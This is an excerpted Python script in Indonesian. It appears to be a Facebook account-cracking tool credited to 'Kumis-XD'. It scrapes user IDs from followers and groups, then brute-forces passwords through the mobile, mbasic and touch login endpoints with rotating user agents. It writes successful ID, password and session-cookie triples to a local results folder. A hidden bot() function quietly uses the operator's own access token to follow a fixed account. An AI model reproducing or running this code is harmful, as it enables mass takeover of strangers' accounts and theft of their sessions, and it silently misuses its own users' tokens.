...
#--------------[ IMPORT-YG-BELUM-INSTALL ]--------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich Bs4 •'))
        os.system('pip install rich && pip install bs4')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests Mechanize •'))
...
\t░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄█ ░▀▀▀▄▄ ▒█░░▒█ ▒█▒█▒█ 
\t▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█░░▀█
				{m}•{k}•{h}•{sir} Author : Kumis-XD {x}{m}•{k}•{h}•{x}
''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; PCAM10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def bot():
	try:
		requests.post("https://graph.facebook.com/100076672262895?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	print(f'[{asu}@{x}] Selamat Datang >> %s%s%s <<'%(asu,my_name,N))
	print('')
	to = '# INFORMATION'
	...
	if __kumis__ in ['1']:
		...
		print(f' ╰──[{m}•{N}] Sukses Logout+Hapus Kukis ')
		exit()
	else:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	sw = '[01] Hasil OK Anda     [02] Hasil CP Anda\n[03] Kembali'
	ws =mark(sw, style='cyan')
	sol().print(ws, title='RESULT-CRACK')
	print(f'[{H}?{x}] Pilih')
	kz = input(f' ╰─── : ')
	if kz in ['2']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print(' ╰──Kasian Tidak Memiliki Hasil OK Jangan Nangis Bree')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		print(f'[{H}+{N}] Masukkan Idz Yang Ke')
		kl = input(' ╰──── '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def dump_pengikut():
	try:
		...
		exit()
	print(f'[{asu}f{x}] Ketik ( {H}me{x} ) Jika Ingin Crack Follower Sendiri ')
	print('Masukan Idz Target')
	pil = input(' ╰── : ')
	try:
...
def lah():
	print(f'\nTotal Idz Yang Terkumpul')
	print(f' ╰── :{h} %s '%(len(id)))
	input(f' {h}╰──[ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	print(f'{x}Masukan Username/Idz Grup')
	id = input(' ╰── : ')
	ua = 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T311 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.66 Safari/537.36'
	...
	if len(ang)==0:
		...
		print(f'{x} Jumlah Anggota')
		print(f' ╰── : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'[{asu}+{x}] Sedang Mengumpulkan Idz ')
	print(f' ╰──Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (Linux; Android 5.0.1; LG-H324 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 YaBrowser/17.11.0.526.00 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	pa = '[01] Akun Old     [02] Akun New\n[03] Akun Random'
	ap = nel(pa, style='cyan')
	cetak(nel(ap,title='OPSI-ACCOUUNT'))
	print('')
	print(f'[{asu}?{x}] pilih')
	hu = input(' ╰─── : ')
	if hu in ['1','01']:
		...
		exit()
	print('')
	kk = ('[01] Mobile     [02] Mbasic\n[03] Touch')
	ik = nel(kk, style='cyan')
	cetak(nel(ik, title='CRACK-METHOD'))
	print('')
	print(f'[{k}?{x}] Pilih')
	hc = input(' ╰──── : ')
	if hc in ['1','01']:
		...
		setting()
	print('')
	print(f'[{k}?{x}] Tambahkan Aplikasi ( Y/t )')
	_jembot_ = input(' ╰─── : ')
	print('')
	if _jembot_ in ['']:
		print('╰───Pilih Yang Bener Kontol ')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kamu,sayang,aku[white] '))
		print(f'[{H}+{x}] Masukan Password Tambahan')
		pwku=input(' ╰─── : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
...
def passwrd():
	si = '# CRACK DIMULAI'
	jp = mark(si, style='green')
	sol().print(jp, style='white')
	print('')
	print(f'[{h}•{x}] Hasil {h}OK{x} Tersimpan Di : {h}%s'%(okc))
	print(f'{x}[{k}•{x}] Hasil {k}CP{x} Tersimpan Di : {k}%s'%(cpc))
	print('')
	ko = '# On Off Mode Pesawat Jika Tidak Ada Result'
	nt = mark(ko, style='white')
	sol().print(nt, style='green')
	print('')
	...
	print(f'[{h}•{x}]{h} OK : {h}%s{N}'%(ok))
	print(f'{x}[{k}•{x}]{k} CP : {k}%s{N}'%(cp))
	print('')
	print(f'[{asu}?{x}] Tampilkan Opsi Check Point ( Y/t ) ? ')
	woi = input(' ╰─── : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		print(f'\t[{H}•{x}]{k} Good Bye Muwwwaah{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r>>{P}[{bo}{loop}{P}/{bo}{len(id)}{P}]—{H}OK{x}:[{H}{ok}{P}]—{k}CP{x}:[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]<<"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 10; IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r>>[{asu}{loop}{P}/{p}{len(id)}{P}]—{H}OK{x}:[{H}{ok}]-{k}CP{x}:[{k}{cp}{x}]—[{asu}{'{:.0%}'.format(loop/float(len(id)))}{P}]<<"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 11; en-US; V2022 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f'\r>>[%s%s/%s{x}]-{H}OK{x}:[{H}%s{x}]-{k}CP{x}:[{k}%s{x}]-[{bi}%s%s%s{x}]<<'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-60-6-1-15; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 9; ASUS_X01BDA Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OPR/63.0.2254.62069"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]'
